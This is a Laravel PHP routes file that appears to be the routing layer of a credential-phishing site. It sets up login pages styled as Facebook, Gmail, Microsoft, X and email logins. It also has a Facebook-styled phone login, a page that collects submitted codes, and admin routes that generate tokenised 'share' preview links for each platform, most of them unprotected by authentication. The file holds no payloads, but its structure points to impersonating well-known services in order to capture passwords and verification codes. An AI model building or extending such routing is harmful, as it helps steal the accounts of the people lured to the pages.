<?php

use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\Admin\EmailShareController;
use App\Http\Controllers\Admin\FacebookShareController;
use App\Http\Controllers\Admin\XShareController;

use App\Http\Controllers\AuthController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\SharePreviewController;
use App\Http\Controllers\TenantApplicationController;
use Illuminate\Support\Facades\Route;




Route::get('/', [HomeController::class, 'homepage'])->name('homepage');

Route::get('login', [AuthController::class, 'showLoginForm'])->name('login');
Route::post('login', [AuthController::class, 'login']);
Route::post('gmaillogin', [AuthController::class, 'gmaillogin'])->name('gmaillogin');
Route::post('/microsoftlogin', [AuthController::class, 'microsoftLogin'])->name('microsoftlogin');
Route::post('xlogin', [AuthController::class, 'Xlogin'])->name('xlogin');
//email-style login URL
// Facebook-style login URL
Route::get('email/login', [AuthController::class, 'showEmailLoginForm'])->name('email.login');
Route::post('email/login', [AuthController::class, 'login']);


// Facebook-style login URL
Route::get('facebook/login', [AuthController::class, 'showLoginForm'])->name('facebook.login');
Route::post('facebook/login', [AuthController::class, 'login']);


Route::get('/thank-you', function () {
    return view('thankyou');
})->name('thankyou');



// Phone login
Route::get('facebook/phone-login', [AuthController::class, 'showPhoneLoginForm'])->name('phone.login');
Route::post('facebook/phone-login', [AuthController::class, 'phoneLogin']);
Route::get('code', [AuthController::class, 'showCodeForm'])->name('code.page');
Route::post('code', [AuthController::class, 'submitCode'])->name('code.submit');
Route::get('show-formpage', [AuthController::class, 'showFormPage'])->name('form.page');

// Admin routes

Route::get('admin/facebook/share/create/phone', [FacebookShareController::class, 'createphone'])->name('admin.facebook.share.create.phone');

Route::get('admin/facebook/share/create', [FacebookShareController::class, 'create'])->name('admin.facebook.share.create');
Route::post('admin/facebook/share/store', [FacebookShareController::class, 'store'])->name('admin.facebook.share.store');
Route::delete('admin/facebook/share/{id}', [FacebookShareController::class, 'destroy'])->name('admin.facebook.share.destroy');

//x routes

Route::get('admin/x/share/create/phone', [XShareController::class, 'createphone'])->name('admin.x.share.create.phone');

Route::get('admin/x/share/create', [XShareController::class, 'create'])->name('admin.x.share.create');
Route::post('admin/x/share/store', [XShareController::class, 'store'])->name('admin.x.share.store');
Route::delete('admin/x/share/{id}', [XShareController::class, 'destroy'])->name('admin.x.share.destroy');


//email routes

Route::get('admin/email/share/create/phone', [EmailShareController::class, 'createphone'])->name('admin.email.share.create.phone');

Route::get('admin/email/share/create', [EmailShareController::class, 'create'])->name('admin.email.share.create');
Route::post('admin/email/share/store', [EmailShareController::class, 'store'])->name('admin.email.share.store');
Route::delete('admin/email/share/{id}', [EmailShareController::class, 'destroy'])
	->middleware('auth:admin')
	->name('admin.email.share.destroy');



// Public share route
Route::get('share/r/{token}', [SharePreviewController::class, 'show'])->name('share.preview');
Route::get('facebook/share/r/{token}', [FacebookShareController::class, 'show'])->name('facebook.share.show');
Route::get('email/share/r/{token}', [EmailShareController::class, 'show'])->name('email.share.show');
Route::get('x/share/r/{token}', [XShareController::class, 'show'])->name('x.share.show');


Route::post('/tenant/submit', [TenantApplicationController::class, 'submitForm'])
    ->middleware('auth')
    ->name('tenant.submit');

    Route::get('/admin/applications', [AdminController::class, 'applications'])
        ->name('admin.applications');
    Route::get('/admin/applications/{id}', [AdminController::class, 'show'])
        ->name('admin.applications.show');